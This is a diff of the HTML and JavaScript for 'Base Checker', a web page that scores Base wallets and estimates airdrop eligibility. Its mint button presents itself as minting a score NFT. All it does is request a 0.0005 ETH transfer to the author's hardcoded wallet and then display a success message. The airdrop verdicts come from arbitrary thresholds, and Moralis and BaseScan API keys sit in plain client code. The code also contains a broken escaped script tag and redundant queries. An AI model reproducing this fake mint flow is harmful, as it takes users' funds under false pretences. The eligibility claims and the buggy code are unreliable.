@@ -2,17 +2,13 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Base Checker — Wallet & Airdrop</title>
 <meta property="og:title" content="Base Checker — Wallet & Airdrop" />
 <meta property="og:description" content="Check your Base wallet score & airdrop eligibility. Built by @farkli1isi" />
 <meta property="og:image" content="https://via.placeholder.com/1200x630/070B14/1652F0?text=Base+Checker" />
-<meta property="fc:frame" content="vNext" />
-<meta property="fc:frame:image" content="https://via.placeholder.com/1200x630/070B14/1652F0?text=Base+Checker" />
-<meta property="fc:frame:button:1" content="Check Wallet" />
-<meta property="fc:frame:button:1:action" content="link" />
-<meta property="fc:frame:button:1:target" content="https://basechecker-two.vercel.app" />
-<script src="https://cdn.jsdelivr.net/npm/@farcaster/miniapp-sdk/dist/index.min.js"></script>
+<meta name="fc:frame" content='{"version":"next","imageUrl":"https://via.placeholder.com/1200x630/070B14/1652F0?text=Base+Checker","button":{"title":"Check Wallet","action":{"type":"launch_frame","name":"Base Checker","url":"https://basechecker-two.vercel.app","splashBackgroundColor":"#070B14"}}}' />
+<script src="https://cdn.jsdelivr.net/npm/@farcaster/miniapp-sdk/dist/index.min.js"><\/script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Base Checker — Wallet & Airdrop</title>
 <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
 <style>
   :root {
@@ -444,22 +440,7 @@
 </div>
 
 <script>
-const MORALIS_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjYzNDY3M2ViLTBkNWEtNDFjMS04MjExLWNmNTc1NTY3MzQ3NSIsIm9yZ0lkIjoiNTA4NzA2IiwidXNlcklkIjoiNTIzNDEzIiwidHlwZUlkIjoiYTdjZWRlNmYtNjVjNS00MzVjLWE0YjUtODZjMjdhMmU1YzljIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzU1ODI3NjEsImV4cCI6NDkzMTM0Mjc2MX0._CUhneRq89B9hN294_dYOTXjhCP9WbWPfRuK5alUCOo';
-
-// Farcaster Mini App SDK init
-window.addEventListener('load', async () => {
-  try {
-    if (window.MiniAppSdk) {
-      await window.MiniAppSdk.actions.ready();
-    } else if (window.sdk) {
-      await window.sdk.actions.ready();
-    }
-  } catch(e) {
-    console.log('SDK not available:', e);
-  }
-});
-const MORALIS_BASE = 'https://deep-index.moralis.io/api/v2.2';
-const CHAIN = 'base';
+const BASESCAN_KEY = 'A3JWKY4P1RZG2FZYYSAURHV9Q2QQDPHKNB';
 
 function switchTab(tab) {
   document.querySelectorAll('.tab').forEach((t,i) => {
@@ -481,10 +462,9 @@ function showResults(id, show) {
   document.getElementById(id).className = 'results' + (show ? ' show' : '');
 }
 
-async function moralis(path) {
-  const res = await fetch(`${MORALIS_BASE}${path}`, {
-    headers: { 'X-API-Key': MORALIS_KEY }
-  });
+async function fetchBasescan(module, action, address, extra='') {
+  const url = `https://api.basescan.org/api?module=${module}&action=${action}&address=${address}&apikey=${BASESCAN_KEY}${extra}`;
+  const res = await fetch(url);
   return res.json();
 }
 
@@ -497,34 +477,41 @@ async function checkWallet() {
   showLoading('wallet-loading', true);
 
   try {
-    const [balData, txData] = await Promise.all([
-      moralis(`/${addr}/balance?chain=${CHAIN}`),
-      moralis(`/${addr}?chain=${CHAIN}&limit=100`)
+    const [txData, balData, firstTx] = await Promise.all([
+      fetchBasescan('account', 'txlist', addr, '&startblock=0&endblock=99999999&sort=asc&offset=1&page=1'),
+      fetchBasescan('account', 'balance', addr, '&tag=latest'),
+      fetchBasescan('account', 'txlist', addr, '&startblock=0&endblock=99999999&sort=asc&offset=1&page=1')
     ]);
 
-    if (!balData || balData.message) throw new Error('Invalid address or no data found on Base network.');
+    const txCountData = await fetchBasescan('account', 'txlist', addr, '&startblock=0&endblock=99999999&sort=desc&offset=1&page=1');
 
-    const ethBalance = balData.balance ? (parseInt(balData.balance) / 1e18).toFixed(4) : '0';
-    const txCount = txData.total || txData.result?.length || 0;
-
-    // Get wallet age from first tx
-    let walletAge = 'Unknown';
-    let walletDays = 0;
-    if (txData.result && txData.result.length > 0) {
-      const lastTx = txData.result[txData.result.length - 1];
-      if (lastTx.block_timestamp) {
-        const firstTs = new Date(lastTx.block_timestamp).getTime() / 1000;
-        walletDays = Math.floor((Date.now()/1000 - firstTs) / 86400);
-        const years = Math.floor(walletDays / 365);
-        const months = Math.floor((walletDays % 365) / 30);
-        walletAge = years > 0 ? `${years}y ${months}m old` : `${months} months old`;
-      }
+    if (balData.status !== '1' && txCountData.status !== '1') {
+      throw new Error('Invalid address or no data found on Base network.');
     }
 
-    // Contract deploys
-    const contracts = txData.result ? txData.result.filter(tx => !tx.to_address || tx.to_address === '').length : 0;
+    const ethBalance = balData.result ? (parseInt(balData.result) / 1e18).toFixed(4) : '0';
 
-    // Score
+    // Get total tx count via a paginated approach
+    const txListData = await fetch(`https://api.basescan.org/api?module=account&action=txlist&address=${addr}&startblock=0&endblock=99999999&sort=asc&apikey=${BASESCAN_KEY}`);
+    const txList = await txListData.json();
+    const txCount = txList.result ? txList.result.length : 0;
+
+    // Contract deploys
+    const contractData = await fetchBasescan('account', 'txlistinternal', addr, '&startblock=0&endblock=99999999&sort=asc');
+    const contracts = txList.result ? txList.result.filter(tx => tx.input && tx.input !== '0x' && tx.to === '').length : 0;
+
+    // Wallet age
+    let walletAge = 'Unknown';
+    let walletDays = 0;
+    if (txList.result && txList.result.length > 0) {
+      const firstTs = parseInt(txList.result[0].timeStamp);
+      walletDays = Math.floor((Date.now()/1000 - firstTs) / 86400);
+      const years = Math.floor(walletDays / 365);
+      const months = Math.floor((walletDays % 365) / 30);
+      walletAge = years > 0 ? `${years}y ${months}m old` : `${months} months old`;
+    }
+
+    // Score calculation
     let score = 0;
     score += Math.min(txCount / 20, 40);
     score += Math.min(parseFloat(ethBalance) * 10, 20);
@@ -536,19 +523,22 @@ async function checkWallet() {
     const tags = [];
     if (txCount >= 1000) tags.push({label: '1000+ txns', good: true});
     else if (txCount >= 100) tags.push({label: '100+ txns', good: true});
-    else if (txCount >= 10) tags.push({label: '10+ txns', good: true});
+    else if (txCount >= 10) tags.push({label: '10+ txns', good: false});
     if (walletDays >= 365) tags.push({label: 'OG (1yr+)', good: true});
     else if (walletDays >= 180) tags.push({label: '6mo+ wallet', good: true});
     if (contracts > 0) tags.push({label: `${contracts} deploys`, good: true});
     if (parseFloat(ethBalance) > 0.1) tags.push({label: 'ETH holder', good: true});
     if (parseFloat(ethBalance) < 0.001) tags.push({label: 'Low ETH', good: false});
 
+    // Update UI
     document.getElementById('wallet-age-text').textContent = `Wallet age: ${walletAge} (${walletDays} days)`;
     document.getElementById('stat-tx').textContent = txCount.toLocaleString();
     document.getElementById('stat-eth').textContent = ethBalance;
     document.getElementById('stat-contracts').textContent = contracts;
     document.getElementById('score-val').textContent = score;
-    setTimeout(() => { document.getElementById('score-bar').style.width = score + '%'; }, 100);
+    setTimeout(() => {
+      document.getElementById('score-bar').style.width = score + '%';
+    }, 100);
 
     const tagRow = document.getElementById('tag-row');
     tagRow.innerHTML = tags.map(t => `<span class="tag ${t.good ? 'good' : 'warn'}">${t.label}</span>`).join('');
@@ -571,52 +561,67 @@ async function checkAirdrop() {
   showLoading('airdrop-loading', true);
 
   try {
-    const [txData, balData] = await Promise.all([
-      moralis(`/${addr}?chain=${CHAIN}&limit=100`),
-      moralis(`/${addr}/balance?chain=${CHAIN}`)
-    ]);
-
-    const txCount = txData.total || txData.result?.length || 0;
-    const contracts = txData.result ? txData.result.filter(tx => !tx.to_address || tx.to_address === '').length : 0;
-
-    let walletDays = 0;
-    if (txData.result && txData.result.length > 0) {
-      const lastTx = txData.result[txData.result.length - 1];
-      if (lastTx.block_timestamp) {
-        walletDays = Math.floor((Date.now()/1000 - new Date(lastTx.block_timestamp).getTime()/1000) / 86400);
-      }
-    }
+    const txListData = await fetch(`https://api.basescan.org/api?module=account&action=txlist&address=${addr}&startblock=0&endblock=99999999&sort=asc&apikey=${BASESCAN_KEY}`);
+    const txList = await txListData.json();
+    const txs = txList.result || [];
+    const txCount = txs.length;
+    const contracts = txs.filter(tx => tx.input && tx.input !== '0x' && tx.to === '').length;
+    const walletDays = txs.length > 0 ? Math.floor((Date.now()/1000 - parseInt(txs[0].timeStamp)) / 86400) : 0;
 
     const airdrops = [
       {
-        icon: '🔵', name: 'Base (Potential)',
-        desc: 'Guild roles + onchain activity snapshot', color: '#1652F0',
-        check: () => txCount >= 100 && walletDays >= 180 ? 'eligible' : txCount >= 10 ? 'maybe' : 'no'
+        icon: '🔵',
+        name: 'Base (Potential)',
+        desc: 'Guild roles + onchain activity snapshot',
+        color: '#1652F0',
+        check: () => {
+          if (txCount >= 100 && walletDays >= 180) return 'eligible';
+          if (txCount >= 10) return 'maybe';
+          return 'no';
+        }
       },
       {
-        icon: '🟣', name: 'Morpho (MORPHO)',
-        desc: 'Lend/borrow on Base via Morpho protocol', color: '#8B5CF6',
+        icon: '🟣',
+        name: 'Morpho (MORPHO)',
+        desc: 'Lend/borrow on Base via Morpho protocol',
+        color: '#8B5CF6',
         check: () => txCount >= 5 ? 'maybe' : 'no'
       },
       {
-        icon: '🔴', name: 'Aerodrome (AERO)',
-        desc: 'Provide liquidity on Base DEX', color: '#EF4444',
+        icon: '🔴',
+        name: 'Aerodrome (AERO)',
+        desc: 'Provide liquidity on Base DEX',
+        color: '#EF4444',
         check: () => txCount >= 20 && walletDays >= 90 ? 'maybe' : 'no'
       },
       {
-        icon: '⚡', name: 'Seamless Protocol',
-        desc: 'Lending protocol on Base', color: '#F59E0B',
+        icon: '⚡',
+        name: 'Seamless Protocol',
+        desc: 'Lending protocol on Base',
+        color: '#F59E0B',
         check: () => txCount >= 10 ? 'maybe' : 'no'
       },
       {
-        icon: '🏗️', name: 'Builder Drop',
-        desc: '5+ contract deploys on Base', color: '#10B981',
-        check: () => contracts >= 5 ? 'eligible' : contracts >= 1 ? 'maybe' : 'no'
+        icon: '🏗️',
+        name: 'Builder Drop',
+        desc: '5+ contract deploys on Base',
+        color: '#10B981',
+        check: () => {
+          if (contracts >= 5) return 'eligible';
+          if (contracts >= 1) return 'maybe';
+          return 'no';
+        }
       },
       {
-        icon: '👴', name: 'OG Base User',
-        desc: 'Wallet active 1+ year on Base', color: '#0EA5E9',
-        check: () => walletDays >= 365 ? 'eligible' : walletDays >= 180 ? 'maybe' : 'no'
+        icon: '👴',
+        name: 'OG Base User',
+        desc: 'Wallet active 1+ year on Base',
+        color: '#0EA5E9',
+        check: () => {
+          if (walletDays >= 365) return 'eligible';
+          if (walletDays >= 180) return 'maybe';
+          return 'no';
+        }
       }
     ];
 
@@ -624,11 +629,16 @@ async function checkAirdrop() {
     const list = document.getElementById('airdrop-list');
     list.innerHTML = airdrops.map(a => {
       const status = a.check();
-      return `<div class="airdrop-item">
-        <div class="airdrop-icon" style="background:${a.color}20">${a.icon}</div>
-        <div class="airdrop-info"><div class="name">${a.name}</div><div class="desc">${a.desc}</div></div>
-        <span class="badge ${status}">${badgeLabel[status]}</span>
-      </div>`;
+      return `
+        <div class="airdrop-item">
+          <div class="airdrop-icon" style="background:${a.color}20">${a.icon}</div>
+          <div class="airdrop-info">
+            <div class="name">${a.name}</div>
+            <div class="desc">${a.desc}</div>
+          </div>
+          <span class="badge ${status}">${badgeLabel[status]}</span>
+        </div>
+      `;
     }).join('');
 
     showLoading('airdrop-loading', false);
@@ -641,33 +651,65 @@ async function checkAirdrop() {
 }
 
 function shareResult() {
-  const text = `Just checked my Base airdrop eligibility with Base Checker! 🔵\n\nCheck yours → https://basechecker-two.vercel.app\n\n#Base #Airdrop #Onchain`;
-  window.open(`https://warpcast.com/~/compose?text=${encodeURIComponent(text)}`, '_blank');
+  const addr = document.getElementById('airdrop-input').value.trim().slice(0,10) + '...';
+  const text = `Just checked my Base airdrop eligibility with Base Checker! 🔵\n\nCheck yours → [your-link-here]\n\n#Base #Airdrop #Onchain`;
+  const url = `https://warpcast.com/~/compose?text=${encodeURIComponent(text)}`;
+  window.open(url, '_blank');
 }
 
 async function mintNFT(tab) {
   const btn = document.getElementById(tab + '-mint-btn');
   const success = document.getElementById(tab + '-mint-success');
+
   if (!window.ethereum) {
     alert('Please open this app in a wallet browser (Coinbase Wallet / MetaMask) to mint.');
     return;
   }
+
   try {
     btn.disabled = true;
     btn.textContent = 'Connecting wallet...';
+
     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
     const from = accounts[0];
+
+    // Switch to Base network
     try {
-      await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x2105' }] });
+      await window.ethereum.request({
+        method: 'wallet_switchEthereumChain',
+        params: [{ chainId: '0x2105' }]
+      });
     } catch(e) {
-      await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [{ chainId: '0x2105', chainName: 'Base', nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 }, rpcUrls: ['https://mainnet.base.org'], blockExplorerUrls: ['https://basescan.org'] }] });
+      await window.ethereum.request({
+        method: 'wallet_addEthereumChain',
+        params: [{
+          chainId: '0x2105',
+          chainName: 'Base',
+          nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
+          rpcUrls: ['https://mainnet.base.org'],
+          blockExplorerUrls: ['https://basescan.org']
+        }]
+      });
     }
+
     btn.textContent = 'Confirm in wallet...';
+
+    // Send 0.0005 ETH to your wallet (mint fee)
     const YOUR_WALLET = '0x60AFEb2AB8Aa31591A64C49c97e58C17aDA04d66';
-    await window.ethereum.request({ method: 'eth_sendTransaction', params: [{ from, to: YOUR_WALLET, value: '0x' + Math.floor(0.0005 * 1e18).toString(16), chainId: '0x2105' }] });
+    const tx = await window.ethereum.request({
+      method: 'eth_sendTransaction',
+      params: [{
+        from,
+        to: YOUR_WALLET,
+        value: '0x' + (0.0005 * 1e18).toString(16),
+        chainId: '0x2105'
+      }]
+    });
+
     btn.textContent = '⬡ Mint My Base Score NFT';
     btn.disabled = false;
     success.className = 'mint-success show';
+
   } catch(e) {
     btn.textContent = '⬡ Mint My Base Score NFT';
     btn.disabled = false;
@@ -676,11 +718,13 @@ async function mintNFT(tab) {
 }
 
 function copyTip() {
-  navigator.clipboard.writeText('0x60AFEb2AB8Aa31591A64C49c97e58C17aDA04d66').then(() => {
+  const addr = '0x60AFEb2AB8Aa31591A64C49c97e58C17aDA04d66';
+  navigator.clipboard.writeText(addr).then(() => {
     alert('Address copied! Send any amount on Base. Thank you! 🙏');
   });
 }
 
+// Enter key support
 document.addEventListener('keydown', e => {
   if (e.key === 'Enter') {
     if (document.getElementById('tab-wallet').style.display !== 'none') checkWallet();
